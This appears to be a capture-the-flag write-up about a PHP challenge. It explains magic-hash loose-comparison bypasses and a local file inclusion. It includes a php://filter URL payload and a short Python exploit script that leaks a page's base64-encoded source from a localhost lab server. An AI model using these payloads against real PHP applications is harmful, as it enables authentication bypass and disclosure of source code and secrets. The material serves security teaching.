# Not a collision

## Overview
To get the flag we can use magic hashes (https://github.com/spaze/hashes/blob/master/md5.md). In fact, two strings whose hash starts with `0e...` followed by random numbers, if compared with a double equals `==`, will pass the if statement.
```php
if ("0e67523434" == "0e87923444"){
    echo "collision";
}
```
This happens because the double equals `==` forces the two strings to be treated as numbers in scientific notation, and both are $0*10^{n}$, that is, $0$.

We also see that a variable `$home` is inserted in `include` which can be `home.php` by default or any resource that we insert in page. This is clearly a file inclusion, more precisely to get the flag we need a file disclosure, this is because the flag isn't printed to us, but we can find it in the source code. Thanks to the php wrappers (https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/Wrappers.md) we can get the flag:
```
http://127.0.0.1:6002/?page=php://filter/convert.base64-encode/resource=home.php
```

## Exploit
```py
from requests import post
from base64 import b64decode
from bs4 import BeautifulSoup

url = "http://127.0.0.1:6002/"

# you can find all collisions here: https://github.com/spaze/hashes

data = {
    "input1": "0e215962017",
    "collision": "click"
}

resp = post(url + "?page=php://filter/convert.base64-encode/resource=home.php", data=data)
source_b64 = BeautifulSoup(resp.text, "html.parser").find_all("p")[-1].get_text().strip()

source = b64decode(source_b64).decode()
print(source)
```